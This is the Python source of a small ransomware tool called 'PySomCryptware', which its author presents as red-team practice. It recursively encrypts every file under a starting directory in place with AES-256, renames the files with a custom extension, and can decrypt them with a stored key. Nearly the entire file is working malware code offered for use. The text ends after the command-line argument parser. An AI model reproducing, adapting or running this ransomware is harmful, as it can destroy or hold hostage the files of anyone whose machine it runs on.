# -*- coding: utf-8 -*-

__author__ = "winterrdog"
__license__ = "GPL 3.0"
__version__ = "1.0.0"
__email__ = "winterrdog@protonmail.ch"
__status__ = "dev"

import os
import sys
import colorama

from os import getenv
from os.path import abspath

from Crypto.Hash import SHA256
from Crypto.Cipher import AES

# Restore previous terminal font color after every 'colorama' print
colorama.init(autoreset=True)

# pass the environment variable, DEBUG_ME, at the cmd line to turn on debugging
DEBUG_ME = getenv('DEBUG_ME')


class PySomCryptware:
    """
    Class that implements all the core ransomware functionality as 
    needed.
    """

    def __init__(self, password, keyfile, start_path) -> None:
        """
        Initialize an instance of the PySomCryptware class
        @param password: password that will be used during symmetric key generation. Default is 'rans0mwar3CanB3Fun'. 
                        Change it so as to see how interesting shxt can get :)
        @param keyfile: file where the generated symmetric key will be stored on disk. Default is 'pysomkey.key'
        @return: None
        """
        # password or passphrase to be hashed during generation of a symmetric key for AES encryption.
        self.password = password

        self.keyfile = keyfile

        # Python set of file extensions to avoid during encryption( You can add yours )
        self.blacklist_exts = {
            "py", "pyc", "key", 'dll', 'so', 'a', 'lib', 'o'
        }

        # starting directory while crypting
        self.start_path = start_path

        # custom file extension for encrypted files
        self.enc_file_ext = ".pysomcryptware"

        # AES symmetric key
        self.key = None

        # AES cipher object for decrypting and decrypting
        self.aes256_cipher = None

        if DEBUG_ME:
            print(f"{colorama.Fore.YELLOW}[+] Debugging mode is ON...\n")

    def _gen_aes_key(self):
        # used SHA256 because it'll produce a 256bit value fit for use with AES256
        key_hash = SHA256.new(self.password.encode("utf-8"))
        self.key = key_hash.digest()

        is_file_present = os.path.exists
        abs_fpath = abspath(self.keyfile)
        if is_file_present(abs_fpath):
            with open(abs_fpath, "rb") as f:
                tkey = f.read()
                if self.key != tkey:
                    self._write_key_to_file()
        else:
            self._write_key_to_file()

    def _init_cipher(self, iv=None):
        if not self.key:
            print(
                f"{colorama.Fore.RED}[-] Generate a symmetric key first, before Initializing the AES cipher. Exiting...",
                file=sys.stderr,
            )
            sys.exit(1)

        self.aes256_cipher = AES.new(self.key, AES.MODE_CFB, iv=iv)

    def _read_key_from_file(self):
        """
        Reads in a key from a file
        """
        with open(self.keyfile, "rb") as fh:
            self.key = fh.read()

        if DEBUG_ME:
            print(
                f"{colorama.Fore.LIGHTGREEN_EX}[+] Key read from file on disk: {self.key}"
            )

    def _write_key_to_file(self):
        """
        Write the key to a key file on disk
        """
        if DEBUG_ME:
            print(
                f"{colorama.Fore.LIGHTGREEN_EX}[+] Key to be written to disk: {self.key}"
            )

        with open(self.keyfile, "wb") as fh:
            fh.write(self.key)

    def start_crypting(self, encryption=True):
        """
        Encrypt or decrypt files from start_path recursively while skipping over
        the blacklisted files
        """
        join_fpaths = os.path.join

        curr_script_path = abspath(__file__)
        for root, _, files in os.walk(self.start_path):
            for each_file in files:
                abs_fpath = abspath(join_fpaths(root, each_file))

                # skip files with an extension in the blacklist and
                # the currently running script( just in case! )
                is_curr_script = abs_fpath == curr_script_path
                ext = abs_fpath.split(".")[-1]
                if ext in self.blacklist_exts or is_curr_script:
                    if DEBUG_ME:
                        print(
                            f"{colorama.Fore.LIGHTGREEN_EX}[+] Skipping( not in target scope ): {abs_fpath}"
                        )

                    continue

                # avoid accidental double encryption
                if (ext == "pysomcryptware") and encryption:
                    if DEBUG_ME:
                        print(
                            f"{colorama.Fore.LIGHTGREEN_EX}[+] Skipping( avoiding double encryption ): '{abs_fpath}'"
                        )

                    continue

                # only decrypt our encrypted files
                if (ext != "pysomcryptware") and (not encryption):
                    print(
                        f"{colorama.Fore.LIGHTGREEN_EX}[+] Skipping( only decrypts '.pysomcryptware' files ): '{abs_fpath}'"
                    )

                    continue

                self._cipher_file(abs_fpath, encryption)

                try:
                    if encryption:
                        os.rename(each_file, f"{each_file}{self.enc_file_ext}")
                    else:
                        new_fname = each_file.replace(self.enc_file_ext, "")
                        os.rename(each_file, new_fname)
                except FileNotFoundError:
                    print(
                        f"{colorama.Fore.RED}[-] That file named ['{each_file}'], was not found so we skipped it. Don't say WTF! :( Fix your issues, man!"
                    )
                    continue

    def _cipher_file(self, fpath, encryption):
        """
        Encrypts/Decrypts a file in-place
        """
        try:
            fh = open(fpath, "rb+")
        except PermissionError:
            print(
                f"{colorama.Fore.RED}[-] Insufficient file permissions. Skipping file: '{fpath}'"
            )
            return
        else:
            in_data, out_data = (b'', b'')

            if encryption:  # encrypt file data
                self._gen_aes_key()
                self._init_cipher()

                in_data = fh.read()

                if DEBUG_ME:
                    print(
                        f"{colorama.Fore.LIGHTGREEN_EX}[+] Current file hash( b4 enc ): {SHA256.new(in_data).hexdigest()}"
                    )

                out_data = b"".join((self.aes256_cipher.iv,
                                     self.aes256_cipher.encrypt(in_data)))
            else:  # decrypt file data
                self._read_key_from_file()

                ivec = fh.read(16)
                self._init_cipher(iv=ivec)

                in_data = fh.read()
                out_data = self.aes256_cipher.decrypt(in_data)

                if DEBUG_ME:
                    print(
                        f"{colorama.Fore.LIGHTGREEN_EX}[+] Current file hash( after dec ): {SHA256.new(out_data).hexdigest()}"
                    )

            # overwriting the previous content
            fh.seek(0)
            fh.write(out_data)
            _ = fh.truncate()  # it's necessary! Don't touch plz!
        finally:
            fh.close()


def get_cmdline_args():
    from argparse import ArgumentParser

    parser = ArgumentParser(
        description=
        "A simple ransomware script to hone your red team skills. Nothing complex :)"
    )
    parser.add_argument(
        "-a",
        "--action",
        metavar="{decrypt | encrypt}",
        default="encrypt",
        help=
        "Specifies the action to carry out when the ransomware is executed. Set to 'encrypt' by default.",
    )
    parser.add_argument(
        "-k",
        "--keyfile",
        default="pysomkey.key",
        help=
        "File where the symmetric key is stored. Set to 'pysomkey.key' by default.",
    )
    parser.add_argument(
        "-p",
        "--password",
        default="rans0mwar3CanB3Fun",
        help=
        "Password used to encrypt/decrypt the locked files. Set to 'rans0mwar3CanB3Fun' by default.",
    )
    parser.add_argument(
        "-s",
        "--startdir",
        default=".",
        help=
        "Directory path where to start when encrypting/decrypting files. Set to '.' by default.",
    )

    return vars(parser.parse_args())
